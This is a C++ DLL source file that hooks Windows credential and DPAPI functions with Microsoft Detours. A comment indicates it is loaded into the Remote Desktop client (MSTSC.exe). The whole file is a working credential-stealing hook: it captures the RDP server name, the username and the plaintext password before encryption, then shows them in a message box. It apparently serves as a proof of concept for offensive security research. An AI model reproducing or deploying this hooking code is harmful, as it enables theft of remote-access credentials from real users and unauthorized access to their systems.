// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include<windows.h>
#include<dpapi.h>
#include<wincred.h>
#include<stdio.h>
#include<strsafe.h>
#include "detours.h"
#pragma comment(lib,"detours.lib")
#pragma comment(lib, "crypt32.lib")

LPCWSTR lpServer = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpTempPassword = NULL;

//original signatures
typedef DPAPI_IMP  BOOL(WINAPI* originalCryptProtectMemoryType)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags);

static BOOL(WINAPI* originalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;
static BOOL(WINAPI* originalCredReadW)(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW *credential) = CredReadW;

//Load Library Dynamically by MSTSC.exe
static originalCryptProtectMemoryType  originalCryptProtectMemory = (originalCryptProtectMemoryType)GetProcAddress(GetModuleHandleW(L"crypt32.dll"), "CryptProtectMemory");


DWORD WINAPI createMessageBox(LPCWSTR lpParam) {
    MessageBox(NULL, lpParam, L"Dll says:", MB_OK);
    return 0;
}

VOID displayCredentials() {
    const DWORD cbBuffer = 1024;
    WCHAR  DataBuffer[cbBuffer];
    memset(DataBuffer, 0x00, cbBuffer);
    StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s Username: %s Password: %s", lpServer, lpUsername, lpTempPassword);
    createMessageBox(DataBuffer);
}

BOOL  _credReadW(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW* credential) {
    lpServer = targetName;
    return originalCredReadW(targetName, type, flags, credential);
}

BOOL _cryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {

    DWORD cbPass = 0;
    LPVOID lpPassword;
    int* ptr = (int*)pDataIn;
    LPVOID lpPasswordAddress = ptr + 0x1;
    memcpy_s(&cbPass, 4, pDataIn, 4);

    //When the password is empty it only counts the NULL byte.
    if (cbPass > 0x2) {
        SIZE_T written = 0;
        lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
        lpTempPassword = (LPCWSTR)lpPassword;
    }

    return originalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

BOOL  _credIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {

    lpUsername = MarshaledCredential;

    displayCredentials();

    return originalCredIsMarshaledCredentialW(MarshaledCredential);
}

void attachDetour() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&originalCryptProtectMemory, _cryptProtectMemory);
    DetourAttach((PVOID*)&originalCredIsMarshaledCredentialW, _credIsMarshaledCredentialW);
    DetourAttach((PVOID*)&originalCredReadW, _credReadW);

    DetourTransactionCommit();
}

void deAttachDetour() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourDetach(&(PVOID&)originalCryptProtectMemory, _cryptProtectMemory);
    DetourDetach(&(PVOID&)originalCredIsMarshaledCredentialW, _credIsMarshaledCredentialW);
    DetourDetach(&(PVOID&)originalCredReadW, _credReadW);

    DetourTransactionCommit();
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        attachDetour();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetour();
        break;
    }
    return TRUE;
}

